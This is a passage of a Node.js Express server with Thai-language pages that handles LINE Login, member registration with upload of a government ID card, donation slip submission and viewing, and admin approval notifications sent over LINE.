                    ` ยอดสนับสนุน : ${selectedPackage.amount.toLocaleString('th-TH')} บาท`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    " สลิป : แนบแล้ว",

                  size:
                    'sm'
                },


                {
                  type: 'text',

                  text:
                    " สถานะ : รอตรวจสอบ",

                  color:
                    '#D97706',

                  weight:
                    'bold',

                  margin:
                    'md'
                }

              ]
            },


            footer: {

              type: 'box',

              layout: 'vertical',

              paddingAll:
                '16px',

              contents: [

                {
                  type: 'button',

                  style:
                    'primary',

                  action: {

                    type:
                      'uri',

                    label:
                      " เปิดดูสลิป",

                    uri:
                      slipUrl

                  }

                }

              ]

            }

          }

        };


        // ส่งทุก ADMIN
        for (
          const adminId
          of ADMIN_IDS
        ) {

          try {

            await push(
              adminId,
              adminFlex
            );

          } catch (err) {

            console.error(
              'SUPPORT ADMIN NOTIFY ERROR:',
              err.response?.data ||
              err.message
            );

          }

        }


        // =================================
        // แจ้ง MEMBER
        // =================================

        try {

          await push(
            lineUser.userId,
            {

              type: 'text',

              text:
`✅ ส่งสลิปสนับสนุนเรียบร้อยแล้ว

เลขคำขอ : ${requestId}
────────────
 แพ็กเกจ : ${selectedPackage.label}
 ยอดสนับสนุน : ${selectedPackage.amount.toLocaleString('th-TH')} บาท

 สถานะ : รอผู้ดูแลระบบตรวจสอบ

เมื่อผู้ดูแลตรวจสอบเรียบร้อยแล้ว
ระบบจะดำเนินการเพิ่มสิทธิ์ให้สมาชิก`

            }
          );

        } catch (err) {

          console.error(
            'SUPPORT MEMBER NOTIFY ERROR:',
            err.response?.data ||
            err.message
          );

        }


        // =================================
        // SUCCESS PAGE
        // =================================

        return res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>ส่งสลิปสำเร็จ</title>

</head>

<body style="
  margin:0;
  min-height:100vh;
  background:#070b11;
  color:#fff;
  font-family:Arial,Tahoma,sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
">

<div style="
  width:100%;
  max-width:450px;
  padding:30px;
  background:#10161f;
  border:1px solid #293747;
  border-radius:20px;
  text-align:center;
">

  <div style="
    font-size:48px;
  ">
    ✅
  </div>

  <h2>
    ส่งสลิปเรียบร้อยแล้ว
  </h2>

  <div style="
    color:#94a3b8;
    line-height:1.8;
    font-size:13px;
  ">

    เลขคำขอ

    <div style="
      margin-top:7px;
      color:#d7b56d;
      font-size:19px;
      font-weight:bold;
    ">
      ${requestId}
    </div>

    <br>

    📅 ${selectedPackage.label}

    <br>

    💰 ${selectedPackage.amount.toLocaleString('th-TH')} บาท

    <br><br>

    🟡 รอผู้ดูแลระบบตรวจสอบ

    <br><br>

    ระบบได้ส่งข้อความยืนยัน
    ไปยัง LINE ของท่านแล้ว

  </div>

</div>

</body>

</html>
        `);


      } catch (err) {

        console.error(
          'SUPPORT REQUEST ERROR:',
          err
        );


        deleteSlip();


        return res.status(500).send(
          '❌ เกิดข้อผิดพลาดในการส่งสลิป'
        );

      }

    }
  );

});

// =====================================
// VIEW SUPPORT SLIP
// =====================================
app.get(
  '/support/slip/:requestId/:token',
  (req, res) => {

    const db =
      loadDB();


    const request =
      db.supportRequests?.[
        req.params.requestId
      ];


    if (
      !request ||
      request.slipViewToken !==
        req.params.token
    ) {

      return res.status(404).send(
        'ไม่พบสลิป'
      );

    }


    const filePath =
      path.join(
        supportUploadDir,
        request.slipFile
      );


    if (!fs.existsSync(filePath)) {

      return res.status(404).send(
        'ไม่พบไฟล์สลิป'
      );

    }


    // ไม่ให้ browser cache
    res.set(
      'Cache-Control',
      'no-store, private'
    );


    return res.sendFile(
      filePath
    );

  }
);

app.get('/moneyflow', (req, res) => {

  const lineUser =
    req.session.lineUser;

  if (!lineUser?.userId) {
    return res.redirect(
      '/line/login?next=%2Fmoneyflow'
    );
  }

  const db = loadDB();

  db.members =
    db.members || {};

  const member =
    db.members[lineUser.userId];

  if (!member) {
    return res.status(403).send(
      '❌ กรุณาลงทะเบียนสมาชิกก่อนใช้งาน'
    );
  }

  const status =
    String(member.status || '')
      .trim()
      .toLowerCase();

  if (status !== 'approved') {
    return res.status(403).send(
      '🔒 บัญชีของท่านยังไม่ได้รับการอนุมัติ'
    );
  }

  const expireDate =
    member.expireAt
      ? new Date(member.expireAt)
      : null;

  if (
    expireDate &&
    !Number.isNaN(expireDate.getTime()) &&
    expireDate.getTime() <= Date.now()
  ) {
    return res.status(403).send(
      '🔒 สิทธิ์สมาชิกของท่านหมดอายุแล้ว'
    );
  }

  return res.sendFile(
    path.join(
      __dirname,
      'private_pages',
      'MoneyFlow_Offline.html'
    )
  );

});

// ==============================
// LINE LOGIN - START
// ==============================
app.get('/line/login', (req, res) => {
  try {

    const nextPage =
      String(req.query.next || '');

    const allowedNextPages = [
  '/member/status',
  '/member/search',
  '/member/search/history',
  '/signal/request',
  '/support',
  '/moneyflow',
  '/member/tools/image',
  '/member/base/request',
  '/member/bank/request'
];

    if (allowedNextPages.includes(nextPage)) {
      req.session.lineLoginNext = nextPage;
    } else {
      delete req.session.lineLoginNext;
    }


    const state =
      crypto
        .randomBytes(24)
        .toString('hex');

    req.session.lineLoginState =
      state;


    const params =
      new URLSearchParams({
        response_type: 'code',
        client_id:
          LINE_LOGIN_CHANNEL_ID,
        redirect_uri:
          LINE_LOGIN_CALLBACK_URL,
        state,
        scope:
          'profile openid'
      });


    // สำคัญ:
    // บันทึก nextPage ลง Session
    // ก่อนออกไป LINE
    req.session.save((err) => {

      if (err) {

        console.error(
          'LINE LOGIN SESSION SAVE ERROR:',
          err
        );

        return res.status(500).send(
          'ไม่สามารถเริ่มการเข้าสู่ระบบได้'
        );
      }


      return res.redirect(
        'https://access.line.me/oauth2/v2.1/authorize?' +
        params.toString()
      );

    });


  } catch (err) {

    console.error(
      'LINE LOGIN ERROR:',
      err
    );

    return res.status(500).send(
      'ไม่สามารถเข้าสู่ระบบ LINE ได้'
    );

  }
});

// ==============================
// LINE LOGIN - CALLBACK
// ==============================
app.get('/line/callback', async (req, res) => {
  try {
    const { code, state, error, error_description } = req.query;

    // กรณีผู้ใช้ยกเลิก หรือ LINE ส่ง error กลับมา
    if (error) {
      console.error('LINE LOGIN ERROR:', error, error_description);

      return res.status(400).send(
        `ไม่สามารถเข้าสู่ระบบ LINE ได้: ${error_description || error}`
      );
    }

    // ตรวจสอบ state
    if (
      !state ||
      !req.session.lineLoginState ||
      state !== req.session.lineLoginState
    ) {
      return res.status(400).send(
        'LINE Login ไม่ถูกต้อง กรุณาเริ่มเข้าสู่ระบบใหม่'
      );
    }

    delete req.session.lineLoginState;

    if (!code) {
      return res.status(400).send(
        'ไม่พบ Authorization Code จาก LINE'
      );
    }

    // ==============================
    // แลก Code เป็น Access Token
    // ==============================
    const tokenParams = new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: LINE_LOGIN_CALLBACK_URL,
      client_id: LINE_LOGIN_CHANNEL_ID,
      client_secret: LINE_LOGIN_CHANNEL_SECRET
    });

    const tokenResponse = await axios.post(
      'https://api.line.me/oauth2/v2.1/token',
      tokenParams.toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const accessToken = tokenResponse.data.access_token;

    if (!accessToken) {
      return res.status(500).send(
        'ไม่สามารถรับ Access Token จาก LINE ได้'
      );
    }

    // ==============================
    // ดึงข้อมูลบัญชี LINE
    // ==============================
    const profileResponse = await axios.get(
      'https://api.line.me/v2/profile',
      {
        headers: {
          Authorization: `Bearer ${accessToken}`
        }
      }
    );

    const profile = profileResponse.data;

    // ==============================
    // เก็บใน Session
    // ==============================
    req.session.lineUser = {
      userId: profile.userId,
      displayName: profile.displayName || '',
      pictureUrl: profile.pictureUrl || ''
    };

    const allowedNextPages = [
  '/member/status',
  '/member/search',
  '/signal/request',
  '/support',
  '/moneyflow',
  '/member/tools/image',
  '/member/base/request',
  '/member/bank/request'
];

const requestedNext =
  req.session.lineLoginNext;

const nextPage =
  allowedNextPages.includes(requestedNext)
    ? requestedNext
    : '/register';

delete req.session.lineLoginNext;


req.session.save((err) => {

  if (err) {

    console.error(
      'SESSION SAVE ERROR:',
      err
    );

    return res.status(500).send(
      'ไม่สามารถบันทึกข้อมูลการเข้าสู่ระบบได้'
    );
  }


  return res.redirect(nextPage);

});

  } catch (err) {
    console.error(
      'LINE CALLBACK ERROR:',
      err.response?.data || err.message
    );

    return res.status(500).send(
      'เกิดข้อผิดพลาดในการเข้าสู่ระบบ LINE'
    );
  }
});

// ==============================
// REGISTER PAGE
// ==============================
app.get('/register', (req, res) => {
  const user = req.session.lineUser;

  // ==============================
  // ต้อง Login LINE ก่อน
  // ==============================
  if (!user?.userId) {
    return res.redirect('/line/login');
  }

  // ==============================
  // ป้องกัน HTML Injection
  // ==============================
  const escapeHtml = (value = '') =>
    String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');

  // ==============================
  // ตรวจสอบข้อมูลสมาชิก
  // ==============================
  const registerDb = loadDB();

  registerDb.members = registerDb.members || {};

  const member =
    registerDb.members[user.userId];

  const memberStatus =
    String(member?.status || '')
      .trim()
      .toLowerCase();

  // ==============================
  // ฟังก์ชันแสดงหน้าสถานะ
  // ==============================
  const showRegisterStatus = ({
    icon,
    title,
    message,
    statusText,
    statusColor,
    borderColor
  }) => {
    const name = escapeHtml(
      member?.fullname ||
      member?.fullName ||
      member?.lineName ||
      user.displayName ||
      '-'
    );

    const uid = escapeHtml(user.userId);

    return res.send(`
<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>${escapeHtml(title)}</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;

  background: #070b11;
  color: #ffffff;

  font-family: Arial, Tahoma, sans-serif;

  display: flex;
  align-items: center;
  justify-content: center;

  padding: 20px;
}

.card {
  width: 100%;
  max-width: 500px;

  background: #10161f;

  border: 1px solid #2b3542;
  border-radius: 20px;

  padding: 36px 26px;

  text-align: center;
}

.icon {
  font-size: 52px;
  margin-bottom: 15px;
}

.title {
  font-size: 21px;
  font-weight: bold;
  margin-bottom: 10px;
}

.name {
  margin-top: 18px;

  color: #ffffff;
  font-size: 16px;
  font-weight: bold;
}

.message {
  margin-top: 12px;

  color: #94a3b8;

  font-size: 14px;
  line-height: 1.8;
}

.status {
  display: inline-block;

  margin-top: 22px;
  padding: 9px 17px;

  border: 1px solid ${borderColor};
  border-radius: 30px;

  color: ${statusColor};

  font-size: 13px;
  font-weight: bold;
}

.uid {
  margin-top: 18px;

  color: #64748b;

  font-size: 10px;
  word-break: break-all;
}
</style>

</head>

<body>

<div class="card">

  <div class="icon">
    ${icon}
  </div>

  <div class="title">
    ${escapeHtml(title)}
  </div>

  <div class="name">
    ${name}
  </div>

  <div class="message">
    ${message}
  </div>

  <div
    class="status"
  >
    ${escapeHtml(statusText)}
  </div>

  <div class="uid">
    UID : ${uid}
  </div>

</div>

</body>
</html>
    `);
  };

  // ==============================
  // สมัครแล้ว รอแอดมินอนุมัติ
  // ==============================
  if (member && memberStatus === 'pending') {
    return showRegisterStatus({
      icon: '🟡',

      title:
        'ท่านลงทะเบียนเรียบร้อยแล้ว',

      message:
        'ระบบได้รับข้อมูลการสมัครของท่านแล้ว<br>' +
        'กรุณารอผู้ดูแลระบบตรวจสอบและอนุมัติ<br>' +
        'ไม่จำเป็นต้องลงทะเบียนซ้ำ',

      statusText:
        'สถานะ : รอการอนุมัติ',

      statusColor:
        '#E6C66F',

      borderColor:
        '#8A713C'
    });
  }

  // ==============================
  // สมาชิกที่ได้รับอนุมัติแล้ว
  // ==============================
  if (member && memberStatus === 'approved') {
    return showRegisterStatus({
      icon: '✅',

      title:
        'ท่านเป็นสมาชิกเรียบร้อยแล้ว',

      message:
        'บัญชี LINE นี้ได้รับการอนุมัติเป็นสมาชิกแล้ว<br>' +
        'สามารถใช้งานระบบตามสิทธิ์ที่ได้รับ<br>' +
        'ไม่จำเป็นต้องลงทะเบียนซ้ำ',

      statusText:
        'สถานะ : สมาชิก',

      statusColor:
        '#86EFAC',

      borderColor:
        '#3C7651'
    });
  }

  // ==============================
  // รองรับสมาชิกเก่าที่มีข้อมูลอยู่แล้ว
  // แต่ไม่มี status
  // ==============================
  if (member && !memberStatus) {
    return showRegisterStatus({
      icon: '🔵',

      title:
        'ท่านลงทะเบียนไว้แล้ว',

      message:
        'ระบบพบข้อมูลการลงทะเบียนของบัญชี LINE นี้แล้ว<br>' +
        'ไม่จำเป็นต้องกรอกข้อมูลสมัครสมาชิกซ้ำ',

      statusText:
        'สถานะ : ลงทะเบียนแล้ว',

      statusColor:
        '#93C5FD',

      borderColor:
        '#3B82F6'
    });
  }

  // ==============================
  // ไม่มีข้อมูลสมาชิก
  // จึงให้แสดงแบบฟอร์มสมัครเดิม
  // ==============================
  const displayName =
    escapeHtml(user.displayName || '-');

  const userId =
    escapeHtml(user.userId || '-');

  const pictureUrl =
    user.pictureUrl
      ? escapeHtml(user.pictureUrl)
      : '';

  return res.send(`
<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>สมัครสมาชิก</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  background: #070b11;
  color: #e5e7eb;
  font-family: Arial, Tahoma, sans-serif;
}

.page {
  padding: 14px;
}

.container {
  width: 100%;
  max-width: 640px;
  margin: 0 auto;
  padding: 24px;
  background: #10161f;
  border: 1px solid #2b3542;
  border-radius: 22px;
}

.section-title {
  font-size: 16px;
  font-weight: 700;
  color: #ffffff;
  margin-bottom: 14px;
}

.account-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.identity-badge {
  border: 1px solid #405064;
  border-radius: 30px;
  padding: 6px 10px;
  font-size: 10px;
  color: #9fb3ca;
}

.line-card {
  display: flex;
  align-items: center;
  gap: 16px;
  border: 1px solid #2c3948;
  background: #080d13;
  padding: 20px;
  border-radius: 16px;
}

.avatar {
  width: 64px;
  height: 64px;
  border-radius: 50%;
  object-fit: cover;
  border: 1px solid #3b495a;
  background: #1e293b;
}

.avatar-default {
  width: 64px;
  height: 64px;
  border-radius: 50%;
  background: #202938;
  border: 1px solid #3b495a;
  display: flex;
  justify-content: center;
  align-items: center;
  font-size: 30px;
}

.account-label {
  font-size: 12px;
  color: #94a3b8;
}

.account-name {
  font-size: 18px;
  color: #ffffff;
  font-weight: bold;
  margin-top: 4px;
}

.account-uid {
  font-size: 11px;
  color: #cbd5e1;
  margin-top: 5px;
  word-break: break-all;
}

.verified {
  color: #b8e7c3;
  font-size: 11px;
  margin-top: 7px;
}

.divider {
  border: 0;
  border-top: 1px solid #293441;
  margin: 26px 0;
}

.description {
  color: #8fa1b5;
  font-size: 12px;
  margin-top: -5px;
  margin-bottom: 20px;
}

.row {
  display: flex;
  gap: 14px;
}

.field {
  width: 100%;
  margin-bottom: 17px;
}

label {
  display: block;
  margin-bottom: 7px;
  color: #d8e4f0;
  font-size: 12px;
  font-weight: 600;
}

.required {
  color: #d8b66c;
}

input[type="text"],
input[type="tel"] {
  width: 100%;
  height: 48px;
  padding: 0 14px;
  border: 1px solid #354355;
  border-radius: 11px;
  outline: none;
  background: #080e15;
  color: #ffffff;
  font-size: 14px;
}

input::placeholder {
  color: #64748b;
}

input:focus {
  border-color: #d5b46c;
}

.upload-box {
  min-height: 140px;
  border: 1px dashed #53667d;
  border-radius: 14px;
  background: #080d13;
  cursor: pointer;

  display: flex;
  align-items: center;
  justify-content: center;

  text-align: center;
  padding: 20px;
}

.upload-box input {
  display: none;
}

.upload-icon {
  font-size: 28px;
  color: #d5e5f5;
}

.upload-title {
  margin-top: 10px;
  color: #dbeafe;
  font-weight: bold;
  font-size: 14px;
}

.upload-sub {
  color: #8297ad;
  font-size: 11px;
  margin-top: 5px;
}

#fileName {
  color: #d8b66c;
  margin-top: 8px;
  font-size: 11px;
}

.consent {
  display: flex;
  gap: 9px;
  align-items: flex-start;
  margin: 18px 0 24px;
  color: #a7b6c7;
  font-size: 11px;
  line-height: 1.6;
}

.consent input {
  margin-top: 4px;
}

.submit-btn {
  width: 100%;
  height: 52px;
  border: 0;
  border-radius: 11px;
  background: #d7b56d;
  color: #151515;
  font-size: 14px;
  font-weight: bold;
  cursor: pointer;
}

.submit-btn:hover {
  opacity: .94;
}

@media (max-width: 600px) {
  .page {
    padding: 8px;
  }

  .container {
    padding: 20px;
    border-radius: 18px;
  }

  .row {
    display: block;
  }

  .line-card {
    padding: 16px;
  }

  .avatar,
  .avatar-default {
    width: 58px;
    height: 58px;
  }
}
</style>

</head>

<body>

<div class="page">

<div class="container">

  <div class="account-header">
    <div class="section-title">
      ข้อมูลบัญชี LINE
    </div>

    <div class="identity-badge">
      IDENTITY
    </div>
  </div>


  <div class="line-card">

    ${
      pictureUrl
        ? `
          <img
            src="${pictureUrl}"
            class="avatar"
            alt="LINE Profile"
          >
        `
        : `
          <div class="avatar-default">
            👤
          </div>
        `
    }

    <div>

      <div class="account-label">
        บัญชีที่เข้าสู่ระบบ
      </div>

      <div class="account-name">
        ${displayName}
      </div>

      <div class="account-uid">
        UID : ${userId}
      </div>

      <div class="verified">
        ● ยืนยันตัวตนผ่าน LINE Login
      </div>

    </div>

  </div>


  <hr class="divider">


  <div class="section-title">
    ข้อมูลผู้สมัคร
  </div>

  <div class="description">
    กรุณากรอกข้อมูลให้ครบถ้วนและตรงตามเอกสารราชการ
  </div>


  <form
    action="/register"
    method="POST"
    enctype="multipart/form-data"
  >

    <div class="row">

      <div class="field">

        <label>
          ยศ
          <span class="required">*</span>
        </label>

        <input
          type="text"
          name="rank"
          placeholder="ระบุยศ"
          maxlength="100"
          required
        >

      </div>


      <div class="field">

        <label>
          ชื่อ - นามสกุล
          <span class="required">*</span>
        </label>

        <input
          type="text"
          name="fullName"
          placeholder="ระบุชื่อ - นามสกุล"
          maxlength="200"
          required
        >

      </div>

    </div>


    <div class="row">

      <div class="field">

        <label>
          ตำแหน่ง
          <span class="required">*</span>
        </label>

        <input
          type="text"
          name="position"
          placeholder="ระบุตำแหน่ง"
          maxlength="150"
          required
        >

      </div>


      <div class="field">

        <label>
          สังกัด
          <span class="required">*</span>
        </label>

        <input
          type="text"
          name="organization"
          placeholder="ระบุหน่วยงาน / สังกัด"
          maxlength="200"
          required
        >

      </div>

    </div>


    <div class="field">

      <label>
        หมายเลขโทรศัพท์
        <span class="required">*</span>
      </label>

      <input
        type="tel"
        name="phone"
        placeholder="เช่น 0812345678"
        inputmode="numeric"
        pattern="[0-9]{9,10}"
        maxlength="10"
        required
      >

    </div>


    <hr class="divider">


    <div class="section-title">
      เอกสารประกอบการสมัคร
    </div>

    <div class="description">
      แนบภาพบัตรข้าราชการหรือเอกสารยืนยันตัวตนที่ชัดเจน
    </div>


    <label class="upload-box">

      <input
        id="idCard"
        type="file"
        name="idCard"
        accept="image/jpeg,image/png"
        required
      >

      <div>

        <div class="upload-icon">
          ▣
        </div>

        <div class="upload-title">
          แนบบัตรข้าราชการ
        </div>

        <div class="upload-sub">
          แตะเพื่อเลือกรูปภาพ • JPG / PNG
        </div>

        <div id="fileName"></div>

      </div>

    </label>


    <div class="consent">

      <input
        type="checkbox"
        name="consent"
        value="yes"
        required
      >

      <div>
        ข้าพเจ้ารับรองว่าข้อมูลที่ระบุเป็นข้อมูลที่ถูกต้อง
        และยินยอมให้ข้อมูลเพื่อการตรวจสอบและพิจารณาสิทธิ์สมัครสมาชิก
      </div>

    </div>


    <button
      class="submit-btn"
      type="submit"
    >
      ยืนยันและส่งคำขอสมัครสมาชิก
    </button>

  </form>

</div>
</div>


<script>
const fileInput = document.getElementById('idCard');
const fileName = document.getElementById('fileName');

fileInput.addEventListener('change', function () {

  if (this.files && this.files.length > 0) {

    fileName.textContent =
      'ไฟล์ที่เลือก : ' + this.files[0].name;

  } else {

    fileName.textContent = '';

  }

});
</script>

</body>
</html>
  `);
});

// ==============================
// REGISTER - SUBMIT
// ==============================
app.post('/register', (req, res) => {

  registrationUpload.single('idCard')(req, res, async (uploadErr) => {
    try {

      if (uploadErr) {
        console.error('REGISTER UPLOAD ERROR:', uploadErr);

        return res.status(400).send(
          `❌ อัปโหลดเอกสารไม่สำเร็จ: ${uploadErr.message}`
        );
      }

      // ต้องผ่าน LINE Login มาก่อน
      const lineUser = req.session.lineUser;

      if (!lineUser || !lineUser.userId) {
        if (req.file?.path) {
          fs.unlink(req.file.path, () => {});
        }

        return res.redirect('/line/login');
      }

      // รับข้อมูลจาก Form
      const rank = String(req.body.rank || '').trim();
      const fullName = String(req.body.fullName || '').trim();
      const position = String(req.body.position || '').trim();
      const organization = String(req.body.organization || '').trim();

      const phone = String(req.body.phone || '')
        .replace(/\D/g, '')
        .trim();

      const consent = req.body.consent === 'yes';

      // ตรวจข้อมูล
      if (
        !rank ||
        !fullName ||
        !position ||
        !organization ||
        !phone
      ) {
        if (req.file?.path) {
          fs.unlink(req.file.path, () => {});
        }

        return res.status(400).send(
          '❌ กรุณากรอกข้อมูลให้ครบถ้วน'
        );
      }

      if (!/^0\d{8,9}$/.test(phone)) {
        if (req.file?.path) {
          fs.unlink(req.file.path, () => {});
        }

        return res.status(400).send(
          '❌ หมายเลขโทรศัพท์ไม่ถูกต้อง'
        );
      }

      if (!consent) {
        if (req.file?.path) {
          fs.unlink(req.file.path, () => {});
        }

        return res.status(400).send(
          '❌ กรุณายืนยันการรับรองข้อมูล'
        );
      }

      if (!req.file) {
        return res.status(400).send(
          '❌ กรุณาแนบเอกสารประกอบการสมัคร'
        );
      }

      const applicationData = {
  userId: lineUser.userId,

  // ข้อมูลจาก LINE
  lineName: lineUser.displayName || '',
  displayName: lineUser.displayName || '',
  pictureUrl: lineUser.pictureUrl || '',

  // ข้อมูลผู้สมัคร
  rank,

  // เก็บทั้ง 2 ชื่อ เพื่อรองรับโค้ดเดิม
  fullname: fullName,
  fullName,

  position,
  organization,
  phone,

  // เอกสาร
  documentFile: req.file.filename,

  // สถานะสมาชิก
  status: 'pending',
  registeredAt: new Date().toISOString()
};


// ==============================
// บันทึกเข้า DB สมาชิกเดิม
// ==============================
const registerDb = loadDB();

registerDb.members = registerDb.members || {};

const oldMember =
  registerDb.members[lineUser.userId];


// ถ้าเป็นสมาชิกที่อนุมัติแล้ว ไม่ให้สมัครซ้ำ
if (oldMember?.status === 'approved') {

  if (req.file?.path) {
    fs.unlink(req.file.path, () => {});
  }

  return res.status(400).send(`
    <!DOCTYPE html>
    <html lang="th">
    <head>
      <meta charset="UTF-8">
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
      >
      <title>เป็นสมาชิกแล้ว</title>
    </head>

    <body style="
      margin:0;
      min-height:100vh;
      background:#070b11;
      color:#fff;
      font-family:Arial,Tahoma,sans-serif;
      display:flex;
      align-items:center;
      justify-content:center;
      text-align:center;
      padding:20px;
    ">

      <div>
        <h2>✅ บัญชีนี้เป็นสมาชิกอยู่แล้ว</h2>

        <p style="color:#94a3b8;">
          ไม่จำเป็นต้องส่งคำขอสมัครสมาชิกใหม่
        </p>
      </div>

    </body>
    </html>
  `);
}

// เก็บ field เดิมไว้ แล้วอัปเดตข้อมูลสมัครใหม่
registerDb.members[lineUser.userId] = {
  ...(oldMember || {}),
  ...applicationData
};


// บันทึกฐานข้อมูล
saveDB(registerDb);

// ==============================
// แจ้งแอดมินว่ามีสมาชิกสมัครใหม่
// ==============================
await notifyAdmins({
  type: 'flex',
  altText: " มีคำขอสมัครสมาชิกใหม่",

  contents: {
    type: 'bubble',
    size: 'mega',

    // ==============================
    // HEADER
    // ==============================
    header: {
      type: 'box',
      layout: 'vertical',
      backgroundColor: '#0F172A',
      paddingAll: '16px',

      contents: [
        {
          type: 'text',
          text: " คำขอสมัครสมาชิกใหม่",
          color: '#FFFFFF',
          weight: 'bold',
          size: 'lg'
        },
        {
          type: 'text',
          text: 'รอการตรวจสอบและอนุมัติ',
          color: '#CBD5E1',
          size: 'sm',
          margin: 'sm'
        }
      ]
    },


    // ==============================
    // BODY
    // ==============================
    body: {
      type: 'box',
      layout: 'vertical',
      spacing: 'md',

      contents: [
        {
          type: 'text',
          text: ` LINE : ${lineUser.displayName || '-'}`,
          wrap: true
        },
        {
          type: 'text',
          text: ` UID : ${lineUser.userId}`,
          size: 'sm',
          wrap: true
        },

        {
          type: 'separator',
          margin: 'md'
        },

        {
          type: 'text',
          text: ` ยศ : ${rank}`,
          wrap: true
        },
        {
          type: 'text',
          text: ` ชื่อ-นามสกุล : ${fullName}`,
          wrap: true
        },
        {
          type: 'text',
          text: ` ตำแหน่ง : ${position}`,
          wrap: true
        },
        {
          type: 'text',
          text: ` สังกัด : ${organization}`,
          wrap: true
        },
        {
          type: 'text',
          text: ` โทรศัพท์ : ${phone}`,
          wrap: true
        },

        {
          type: 'separator',
          margin: 'md'
        },

        {
          type: 'text',
          text: " สถานะ : รอการอนุมัติ",
          color: '#B7791F',
          weight: 'bold',
          margin: 'md'
        }
      ]
    },


    // ==============================
    // FOOTER - ปุ่มอนุมัติ
    // ==============================
    footer: {
      type: 'box',
      layout: 'vertical',
      spacing: 'sm',
      paddingAll: '16px',

      contents: [

        // 30 / 90 วัน
        {
          type: 'box',
          layout: 'horizontal',
          spacing: 'sm',

          contents: [
            {
              type: 'button',
              style: 'primary',
              height: 'sm',

              action: {
                type: 'postback',
                label: '✅ 30 วัน',
                data: `approve_days|${lineUser.userId}|30`,
                displayText: `อนุมัติ ${fullName} 30 วัน`
              }
            },

            {
              type: 'button',
              style: 'primary',
              height: 'sm',

              action: {
                type: 'postback',
                label: '✅ 90 วัน',
                data: `approve_days|${lineUser.userId}|90`,
                displayText: `อนุมัติ ${fullName} 90 วัน`
              }
            }
          ]
        },


        // 180 / 365 วัน
        {
          type: 'box',
          layout: 'horizontal',
          spacing: 'sm',

          contents: [
            {
              type: 'button',
              style: 'secondary',
              height: 'sm',

              action: {
                type: 'postback',
                label: '180 วัน',
                data: `approve_days|${lineUser.userId}|180`,
                displayText: `อนุมัติ ${fullName} 180 วัน`
              }
            },

            {
              type: 'button',
              style: 'secondary',
              height: 'sm',

              action: {
                type: 'postback',
                label: '365 วัน',
                data: `approve_days|${lineUser.userId}|365`,
                displayText: `อนุมัติ ${fullName} 365 วัน`
              }
            }
          ]
        }

      ]
    }

  }
});

console.log(
  'REGISTER DATA:',
  applicationData
);

      return res.send(`
<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>ส่งคำขอสำเร็จ</title>

<style>
body {
  margin: 0;
  min-height: 100vh;
  background: #070b11;
  color: #ffffff;
  font-family: Arial, Tahoma, sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.card {
  width: 100%;
  max-width: 460px;
  background: #10161f;
  border: 1px solid #2b3542;
  border-radius: 20px;
  padding: 35px 25px;
  text-align: center;
}

.icon {
  font-size: 48px;
}

h2 {
  margin: 15px 0 10px;
}

p {
  color: #94a3b8;
  line-height: 1.7;
}

.status {
  display: inline-block;
  margin-top: 15px;
  padding: 8px 16px;
  border: 1px solid #806a3d;
  border-radius: 30px;
  color: #e3c271;
}
</style>
</head>

<body>

<div class="card">

  <div class="icon">✅</div>

  <h2>
    ส่งคำขอสมัครสมาชิกสำเร็จ
  </h2>

  <p>
    ระบบได้รับข้อมูลของคุณแล้ว<br>
    กรุณารอผู้ดูแลระบบตรวจสอบและอนุมัติ
  </p>

  <div class="status">
    สถานะ : รอตรวจสอบ
  </div>

</div>

</body>
</html>
      `);

    } catch (err) {

      console.error('REGISTER ERROR:', err);

      if (req.file?.path) {
        fs.unlink(req.file.path, () => {});
      }

      return res.status(500).send(
        '❌ เกิดข้อผิดพลาดในการสมัครสมาชิก'
      );
    }
  });
});

// =====================================
// MEMBER SEARCH PAGE
// ต้อง Login LINE ก่อน
// =====================================
app.get(
  '/member/search',
  (req, res) => {

    const lineUser =
      req.session.lineUser;


    // ยังไม่ได้ Login LINE
    if (!lineUser?.userId) {

      return res.redirect(
        '/line/login?next=%2Fmember%2Fsearch'
      );
    }


    // Login แล้ว เปิดหน้าค้นหา
    return res.sendFile(
      path.join(
        __dirname,
        'private_pages',
        'member-search.html'
      )
    );

  }
);

// =====================================
// MEMBER SEARCH : PROFILE API
// =====================================
app.get('/member/search/me', (req, res) => {

  const lineUser =
    req.session.lineUser;

  // ยังไม่ได้ Login LINE
  if (!lineUser?.userId) {
    return res.status(401).json({
      ok: false,
      loginUrl:
        '/line/login?next=%2Fmember%2Fsearch'
    });
  }


  const db =
    loadDB();

  db.members =
    db.members || {};


  const member =
    db.members[
      lineUser.userId
    ];


  // ไม่พบสมาชิก
  if (!member) {
    return res.status(403).json({
      ok: false,
      message:
        'ไม่พบข้อมูลสมาชิก'
    });
  }


  const phone =
    String(
      member.phone ||
      member.tel ||
      member.mobile ||
      ''
    )
      .replace(/\D/g, '');


  // =============================
  // วันหมดอายุ
  // =============================

  const expireAt =
    member.expireAt || '';


  let remainingDays =
    null;


  if (expireAt) {

    const expireDate =
      new Date(expireAt);

    if (
      !Number.isNaN(
        expireDate.getTime()
      )
    ) {

      const diff =
        expireDate.getTime() -
        Date.now();

      remainingDays =
        Math.max(
          0,
          Math.ceil(
            diff /
            (1000 * 60 * 60 * 24)
          )
        );
    }
  }


  // =============================
  // สิทธิ์ SI
  // =============================

  const siAllowed =
